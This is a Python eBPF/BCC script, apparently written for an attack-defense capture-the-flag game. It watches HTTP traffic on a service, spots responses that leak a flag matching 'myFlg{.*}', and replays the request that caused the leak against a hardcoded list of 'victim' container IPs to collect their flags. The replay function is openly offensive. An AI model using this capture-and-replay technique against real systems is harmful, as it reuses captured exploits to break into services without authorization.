#!/usr/bin/python

from bcc import BPF
from io import StringIO
import ctypes as ct
import pyroute2, time, socket, sys, argparse, re, struct, binascii, threading, urllib3, email, zlib

session_table       = None
local_dictionary    = {}
crlf                = b"\r\n"                  #CR + LF (substring to find)
http                = urllib3.PoolManager()    
EGRESS              = 0xfaceb00d
INGRESS             = 0xfaceb00c
ETH_HLEN            = 14                   #ethernet header length
TIMEOUT             = 2
PATTERN             = 'myFlg{.*}'
VICTIMS_IPS         = ['172.17.0.4:80', '172.17.0.5:80']

def printEntry(key, value):
  saddr = socket.inet_ntoa(int(key.saddr).to_bytes(4, "little"))
  daddr = socket.inet_ntoa(int(key.daddr).to_bytes(4, "little"))
  sport = socket.ntohs(key.sport)
  dport = socket.ntohs(key.dport)
  print(f'From {saddr}:{sport} To {daddr}:{dport}\t=>\t {value.value}')


def decodeMessage(message):
    index_payload = message.index(crlf+crlf) + 4
    decoded = message[:index_payload].decode('utf-8')
    if len(message) <= index_payload:
        return decoded
    
    match = re.search('Content-Encoding: (.*)\\r\\n', decoded)
    encoding = match.group(1) if match else 'utf-8' if match else 'utf-8'
    
    match = re.search('Content-Length: (.*)\\r\\n', decoded)
    length = int(match.group(1)) if match else 0
    
    if length == 0:
        return decoded

    to_be_decoded = message[-length-2:]
    if encoding == 'utf-8':
        decoded += to_be_decoded.decode('utf-8')
    elif encoding == 'gzip':
        decoded += zlib.decompress(to_be_decoded, wbits=zlib.MAX_WBITS|16).decode('utf-8')
    elif encoding == 'deflate':
        decoded += zlib.decompress(to_be_decoded, wbits=-zlib.MAX_WBITS).decode('utf-8')
    elif encoding == 'zlib':
        decoded += zlib.decompress(to_be_decoded, wbits=zlib.MAX_WBITS).decode('utf-8')
    else:
        print(f"Unknown encoding {encoding}")

    return decoded

def doAttack(raw):
    global http
    
    first, headers = raw.split('\r\n', 1)
    message = email.message_from_file(StringIO(headers))
    headers = dict(message.items())
    first = first.split(" ")

    print("\n>>>>>>>>>>Counter Attacks")
    for victim in VICTIMS_IPS:
        # It would be easier forwarding the raw packet through raw socket
        # but they are not efficient and optimized, thus a simple GET
        # would take more than 3 seconds to send-receive
        print(f"Replay attack to victim {victim} => ", end="")
        try:
            res = http.request(first[0], victim + first[1],headers=headers, body=message.get_payload(), timeout=TIMEOUT)
            match = re.search(PATTERN, res.data.decode('utf-8'))
            print(match.group(0)) if match else print(" did not worked")
        except:
            print(" did not worked")


def print_skb_event(cpu, data, size):
    global session_table, local_dictionary
    class SkbEvent(ct.Structure):
        _fields_ =  [ ("magic", ct.c_uint32),
                      ("raw", ct.c_ubyte * (size - ct.sizeof(ct.c_uint32))) ]

    is_from_ingress = False;
    skb_event = ct.cast(data, ct.POINTER(SkbEvent)).contents

    '''
    for k,v in session_table.items():
        printEntry(k, v)
    '''
    if skb_event.magic == EGRESS:
        is_from_ingress = False
    elif skb_event.magic == INGRESS:
        is_from_ingress = True;
    else:
        print(f'Got a packet not from Ingress/Egress (magic={skb_event.magic}), fix this.')
        return

    #convert packet into bytearray
    packet_bytearray = bytearray(skb_event.raw)
  
    #IP HEADER
    #https://tools.ietf.org/html/rfc791
    # 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    # +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    # |Version|  IHL  |Type of Service|          Total Length         |
    # +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    #
    #IHL : Internet Header Length is the length of the internet header 
    #value to multiply * 4 byte
    #e.g. IHL = 5 ; IP Header Length = 5 * 4 byte = 20 byte
    #
    #Total length: This 16-bit field defines the entire packet size, 
    #including header and data, in bytes.

    #calculate packet total length
    total_length = packet_bytearray[ETH_HLEN + 2]               #load MSB
    total_length = total_length << 8                            #shift MSB
    total_length = total_length + packet_bytearray[ETH_HLEN+3]  #add LSB
    
    #calculate ip header length
    ip_header_length = packet_bytearray[ETH_HLEN]               #load Byte
    ip_header_length = ip_header_length & 0x0F                  #mask bits 0..3
    ip_header_length = ip_header_length << 2                    #shift to obtain length

    #retrieve ip source/dest
    ip_src_str = packet_bytearray[ETH_HLEN+12:ETH_HLEN+16]            #ip source offset 12..15
    ip_dst_str = packet_bytearray[ETH_HLEN+16:ETH_HLEN+20]            #ip dest   offset 16..19

    ip_src = int.from_bytes(ip_src_str, 'little')
    ip_dst = int.from_bytes(ip_dst_str, 'little')    
    
    #TCP HEADER 
    #https://www.rfc-editor.org/rfc/rfc793.txt
    #  12              13              14              15  
    #  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
    # +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    # |  Data |           |U|A|P|R|S|F|                               |
    # | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
    # |       |           |G|K|H|T|N|N|                               |
    # +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    #
    #Data Offset: This indicates where the data begins.  
    #The TCP header is an integral number of 32 bits long.
    #value to multiply * 4 byte
    #e.g. DataOffset = 5 ; TCP Header Length = 5 * 4 byte = 20 byte

    #calculate tcp header length
    tcp_header_length = packet_bytearray[ETH_HLEN + ip_header_length + 12]  #load Byte
    tcp_header_length = tcp_header_length & 0xF0                            #mask bit 4..7
    tcp_header_length = tcp_header_length >> 2                              #SHR 4 ; SHL 2 -> SHR 2
  
    #retrieve port source/dest
    port_src_str = packet_bytearray[ETH_HLEN+ip_header_length:ETH_HLEN+ip_header_length+2]
    port_dst_str = packet_bytearray[ETH_HLEN+ip_header_length+2:ETH_HLEN+ip_header_length+4]
    
    port_src = int.from_bytes(port_src_str, 'little')
    port_dst = int.from_bytes(port_dst_str, 'little')

    #calculate payload offset
    payload_offset = ETH_HLEN + ip_header_length + tcp_header_length
  
    #payload_string contains only packet payload
    payload_string = packet_bytearray[(payload_offset):(len(packet_bytearray))]

    #current_Key contains ip source/dest and port source/map
    #useful for direct session_table map access
    current_Key = session_table.Key(ip_src,ip_dst,port_src,port_dst) if is_from_ingress is False else session_table.Key(ip_dst,ip_src,port_dst,port_src)

    key = binascii.hexlify(current_Key)
    if key not in local_dictionary:
        local_dictionary[key] = {"done_egress": False, "done_ingress": False, "egress_messages": [b""], "ingress_messages": [b""]}
    entry = local_dictionary[key]
    
    if is_from_ingress is True:
        if entry['done_ingress'] is True: entry['ingress_messages'].append(payload_string)
        else: entry['ingress_messages'][-1] += payload_string
        if crlf in payload_string:
            entry['done_ingress'] = True 
            entry['ingress_messages'][-1] = decodeMessage(entry['ingress_messages'][-1])
        else:
            entry['done_ingress'] = False
    else:
        if entry['done_egress'] is True: entry['egress_messages'].append(payload_string)
        else: entry['egress_messages'][-1] += payload_string
        if crlf in payload_string:
            entry['done_egress'] = True
            entry['egress_messages'][-1] = decodeMessage(entry['egress_messages'][-1])
            if re.search(PATTERN, entry['egress_messages'][-1]):
                print("-------------------------- Attack Detected --------------------------\n"
                    f'>>>>>>>>>>Request\n{entry["ingress_messages"][-1]}'
                    f'>>>>>>>>>>Answer\n{entry["egress_messages"][-1]}')
                threading.Timer(0, doAttack, (entry['ingress_messages'][-1],)).start()
        else:
            entry['done_ingress'] = False


def main():
    global session_table

    args = parseArguments()

    flags       = 0
    skb         = args['skb']
    hw          = args['hardware']
    mode        = args['mode']
    device      = args['interface']
    service_ip  = args['ip']

    if skb is True:
        # XDP_FLAGS_SKB_MODE
        flags |= (1 << 1)

    if hw is True:
        # XDP_FLAGS_HW_MODE
        flags |= (1 << 3)

    if mode == "XDP":
        mode = BPF.XDP
        ret_ko = "XDP_DROP"
        ret_ok = "XDP_PASS"
        ctxtype = "xdp_md"
        offload_device = device
    else:
        mode = BPF.SCHED_CLS
        ret_ko = "TC_ACT_SHOT"
        ret_ok = "TC_ACT_OK"
        ctxtype = "__sk_buff"
        offload_device = None

    if service_ip is None:
        service_ip = -1
    else:
        service_ip = struct.unpack("<L", socket.inet_aton(service_ip))[0]

    print('Compiling eBPF programs')
    # load BPF program
    b = BPF(src_file="http_filter.c", debug=0, cflags=["-w", "-DDROP=%s" % ret_ko, "-DPASS=%s" % ret_ok , "-DCTXTYPE=%s" % ctxtype, "-DSERVICE_IP=%s" % service_ip], device=offload_device)

    ingress_fn = b.load_func("handle_ingress", mode, offload_device)
    egress_fn = b.load_func("handle_egress", mode, offload_device)

    print('Attaching programs to chain')
    if mode == BPF.XDP:
        b.attach_xdp(device, ingress_fn, flags)
        #CANNOT ATTACH Egress to XDP
    else:
        ip = pyroute2.IPRoute()
        ipdb = pyroute2.IPDB(nl=ip)
        idx = ipdb.interfaces[device].index

        ip.tc("add", "clsact", idx)
        ip.tc("add-filter", "bpf", idx, ":1", fd=ingress_fn.fd, name=ingress_fn.name,
            parent="ffff:fff3", classid=1, direct_action=True)
        ip.tc("add-filter", "bpf", idx, ":1", fd=egress_fn.fd, name=egress_fn.name,
            parent="ffff:fff2", classid=1, direct_action=True)
    
    b["skb_events"].open_perf_buffer(print_skb_event)
    session_table = b["HTTP_SESSIONS"]
    print("Starting analysis, hit CTRL+C to stop")
    while True:
        try:
            b.perf_buffer_poll()
        except KeyboardInterrupt:
            print("Removing filters from device")
            break;

    if mode == BPF.XDP:
        b.remove_xdp(device, flags)
    else:
        ip.tc("del", "clsact", idx)
        ipdb.release()


def parseArguments():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('interface', help='indicates the interface to attach programs', type=str)
    parser.add_argument('-m', '--mode', help='set the mode (XDP or CLS)', type=str, default="CLS")
    parser.add_argument('-S', '--skb', help='use the skb mode if XDP', action='store_true')
    parser.add_argument('-H', '--hardware', help='use the hardware offload mode if XDP', action='store_true')
    parser.add_argument('-i', '--ip', help='the ip of the service to protect if any', type=str, default=None)
    return parser.parse_args().__dict__


if __name__ == '__main__':
    main()